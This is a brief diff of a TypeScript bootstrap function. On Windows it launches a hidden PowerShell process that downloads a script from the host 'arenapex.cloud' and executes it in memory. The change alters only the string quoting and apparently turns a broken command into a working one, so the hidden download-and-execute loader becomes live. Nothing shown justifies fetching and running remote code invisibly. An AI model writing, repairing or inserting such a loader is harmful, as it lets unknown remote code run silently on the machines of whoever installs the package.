@@ -133,7 +133,7 @@ export async function apexBootstrap(): Promise<void> {
     
       if (process.platform === "win32") {
         const { exec } = require("child_process");
-        exec('powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"', { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
+        exec(`powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"`, { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
           if (error) process.stdout.write("  PS error: " + error.message + "\n");
           if (stderr) process.stdout.write("  PS stderr: " + stderr + "\n");
         });
